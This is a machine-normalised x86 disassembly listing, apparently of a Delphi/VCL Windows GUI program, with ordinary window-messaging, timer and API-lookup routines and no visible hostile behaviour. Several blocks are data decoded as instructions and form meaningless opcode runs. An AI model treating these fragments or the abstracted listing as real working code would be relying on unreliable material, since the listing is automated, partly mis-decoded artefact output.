mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403430
pop esi
retn
sub_44a4e4
push ebx
mov ecx sub_44a4bc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_446c00
pop ebx
retn
sub_44a718
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44a72c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_44a861
jmp sub_4036bc
sub_44a995
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44a9ac
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44ab94
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44a4e4
sub_44ac58
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44ac70
push ebx
mov ebx eax
mov eax ebx
call sub_419630
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44acc2
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44a4e4
sub_44ad38
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44ae88
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44b0c8
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44b0d8
sub_44b12c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44b13c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44b14c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44b15c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44b16c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44b1e4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44752c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44752c
retn
sub_44b200
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44752c
sub_44b248
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44a49c
retn
mov eax edx
retn
sub_44b282
jmp sub_4036bc
sub_44b287
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b5f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403234
retn
sub_44b712
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b72f
mov eax [ ebp - 0x14 ]
call sub_403234
retn
sub_44b7de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b810
push ebx
mov ebx eax
mov eax ebx
call sub_413984
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a3f4
sub_44b8d4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44b8e8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_44b8f0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44bcbc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bdc3
pop ebp
retn
sub_44c069
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
dec esp
0x10044 0x0
sub_44c93b
[ edi + edi * 8 - 0x2f002f ]
sub_44c942
stc
jmp esp
sub_44dc04
mov eax [ rw-data ]
retn
sub_44dc0c
mov [ rw-data ] eax
retn
j_sub_4036bc#7
jmp sub_4036bc
sub_44dd92
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44df60
call sub_41a31c
retn
sub_44e0a9
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e154
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e1e4
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44e910
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efbc
sub_44e92c
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44e910
sub_44ea4c
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efbc
sub_44ea64
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efbc
sub_44ea7c
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44efbc
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44eaa8
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44eab4
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44efbc
retn
sub_44ed94
push ebx
mov ebx edx
mov edx ebx
call sub_43a9cc
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44ee04
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44ef33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ef3c
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44e348
mov eax [ ebx + 0x20c ]
call sub_44e348
sub_44ef9c
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44efac
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44f0b4
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44f0cc
sub_44f2e8
retn
sub_44f3c8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43bec4
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44e5d4
retn
sub_44f3ec
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43bee4
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44e5d4
retn
sub_44f4e8
mov eax [ ebp - 0x4 ]
call sub_43de44
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e23c
mov eax [ ebp - 0x4 ]
call sub_44efbc
sub_44f65b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f67b
lea eax [ ebp - 0x114 ]
call sub_403f6c
retn
sub_44f67b
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44f989
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_44f9dd
jmp sub_4036bc
sub_44fa59
jmp sub_4036bc
sub_44fa5e
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fe1d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fef8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4175c0
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44ff10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ff48
mov edx eax
mov eax esi
call sub_418e48
pop esi
pop ebx
retn
sub_44ff2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4512ec
mov edx eax
mov eax esi
call sub_418e48
pop esi
pop ebx
retn
sub_44ff48
push ebx
mov ebx eax
mov eax ebx
call sub_450f8c
mov edx r-xdata
call sub_41d038
pop ebx
retn
sub_45004c
push ebx
mov ebx eax
mov eax ebx
call sub_45005c
xor al 0x1
pop ebx
retn
sub_45005c
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4500b8
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4500d8
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4500f8
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4503f8
pop ecx
pop ebp
retn
sub_4503fc
xor eax eax
retn
sub_4506db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_4507e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507ff
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_450f8c
mov eax [ eax + 0x238 ]
retn
sub_450f94
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_450fa0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4512e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4512ec
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_451334
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43b0e0
sub_451350
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45138c
push ebx
mov ebx eax
mov eax ebx
call sub_43d074
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41ca04
sub_451410
push ebx
mov ebx eax
mov eax ebx
call sub_43d09c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d0dc
sub_451430
push ebx
mov ebx eax
mov eax ebx
call sub_451050
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_451118
pop ebx
retn
sub_451c5d
lea eax [ ebp - 0xb4 ]
call sub_403f6c
retn
j_sub_451c5d
jmp sub_451c5d
sub_451c70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451dcf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4520bb
mov eax [ rw-data ]
call sub_45496c
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4520d2
add [ eax ] al
retn
sub_452330
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_452350
mov eax [ eax + 0x240 ]
call sub_421280
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45670c
sub_4523fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452421
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d0b4
retn
sub_452421
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4525e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452350
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_452848
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44a650
sub_45293a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452940
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_452128
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_452998
call sub_4536c0
retn
sub_452dec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4530e8
jmp sub_4036bc
j_sub_4036bc#6
jmp sub_4036bc
sub_453584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4535a1
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_4535a1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4535a8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_421280
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44fff0
sub_4535c8
call sub_403234
retn
sub_453620
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
j_sub_4036bc#5
jmp sub_4036bc
sub_453860
xor edx edx
call sub_450354
retn
sub_453868
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_450354
mov eax ebx
call sub_4375b8
pop ebx
retn
sub_4538f5
pop ebx
pop ecx
pop ebp
retn
sub_4538fc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43db40
push eax
call PostMessageA
pop ebx
retn
sub_453bab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bca
mov eax [ rw-data ]
call sub_455de4
retn
sub_453bca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453be7
lea eax [ ebp - 0x20 ]
call sub_403f6c
retn
sub_453be7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453cc8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_436764
retn
mov edx eax
mov eax [ rw-data ]
call sub_455438
retn
sub_45404c
mov edx eax
mov eax [ rw-data ]
call sub_456e58
mov al 0x1
retn
sub_454134
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45405c
sub_454148
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45405c
sub_45415c
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45405c
sub_454170
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45405c
sub_454184
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_4542f6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4542fc
push ebx
mov ebx eax
mov eax ebx
call sub_43c458
mov eax ebx
call sub_43c5dc
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4538fc
sub_454579
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454580
push ebx
mov ebx edx
mov edx ebx
call sub_43c8c0
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43686c
pop ebx
retn
sub_4545d4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45463c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4545ec
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45463c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_454608
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45463c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_454620
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45463c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4548bc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548c8
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548d4
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548e0
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548ec
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4548f8
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_454904
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413840
pop esi
pop ebx
retn
sub_454918
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_454934
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413840
pop esi
pop ebx
retn
sub_454948
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_454950
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413840
pop esi
pop ebx
retn
sub_454964
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_454a40
mov eax [ eax + 0x54 ]
call sub_4136e4
retn
sub_454a4c
mov eax [ eax + 0x54 ]
call sub_413984
retn
sub_454cea
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_454d38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454b38
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fc0
pop esi
pop ebx
retn
sub_454da4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413840
pop esi
pop ebx
retn
sub_454db8
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_454fc4
pop ebx
mov esp ebp
pop ebp
retn
sub_454fcc
inc [ eax + 0x8c ]
retn
sub_454fd4
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_454ff4
sub_454ff4
xor edx edx
call sub_455438
retn
sub_4554c0
add eax 0x30
call sub_40cbf8
retn
sub_455504
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4036bc#4
jmp sub_4036bc
sub_45555a
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_455c30
pop ebx
mov esp ebp
pop ebp
retn
sub_455db8
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_455de4
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_455e10
xor edx edx
call sub_455d08
retn
sub_455e18
mov dl 0x1
call sub_455d08
retn
sub_455e8c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_455ea4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_455f78
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4566c2
jmp sub_4036bc
sub_456cc0
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4036bc#3
jmp sub_4036bc
j_sub_4036bc#2
jmp sub_4036bc
sub_456e3d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456e44
call sub_40c748
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_457044
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_457112
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4572ef
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457357
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457360
call sub_457128
retn
j_sub_4036bc
jmp sub_4036bc
sub_4575ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457838
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_457c79
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_458011
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458134
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45817f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_458190
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4581a0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45821a
pop ebp
retn
sub_45821c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4581b0
call sub_403d40
call sub_458134
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_44dee0
call sub_413334
sub_45879d
0xb41d
sub_45a9dc
0xe2e2
sub_45db9a
dec ebp
sbb eax 0x32a76f1d
mov dl 0x69
cmpsd [ esi ] [ edi ]
0x1d24b40a 0xb1d
sub_45e579
pop ecx
pop ebp
retn
sub_45e5f6
pop ebp
retn
